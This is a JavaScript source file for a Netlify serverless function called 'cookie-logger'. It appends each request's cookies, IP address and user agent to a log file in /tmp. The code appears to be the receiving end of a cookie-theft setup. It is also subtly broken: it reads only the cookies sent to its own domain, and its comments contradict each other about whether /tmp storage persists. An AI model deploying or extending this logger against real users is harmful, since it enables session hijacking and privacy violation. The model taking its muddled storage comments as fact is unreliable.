// netlify/functions/cookie-logger.js
exports.handler = async (event, context) => {
  const fs = require('fs');
  const path = require('path');

  // Get cookies from the header
  const cookies = event.headers.cookie || '';
  
  // Optional: Get IP and User Agent
  const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown';
  const ua = event.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString();

  // Format the log entry
  const logEntry = `[${timestamp}] IP: ${ip} | UA: ${ua} | Cookies: ${cookies}\n`;

  // Path to log file (Netlify functions run in a temp dir, but Netlify provides a persistent /tmp or you can use the function's local file system if configured correctly. 
  // For a simple logger, we'll write to the function's local directory which persists during the function's lifecycle. 
  // For true persistence across invocations in Netlify, we usually rely on the fact that /tmp is ephemeral. 
  // However, Netlify's standard practice for serverless is to write to /tmp and it persists. 
  // But if you want a single log.txt file in the repo, note that functions are stateless. 
  // To make it persistent, we'll write to /tmp/log.txt which is standard for Netlify functions.
  
  const logPath = '/tmp/log.txt';
  
  try {
    // Append the log entry
    fs.appendFileSync(logPath, logEntry);
    
    // Return a success response
    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: 'Cookie logged' })
    };
  } catch (error) {
    console.error('Error logging cookie:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: 'Failed to log cookie' })
    };
  }
};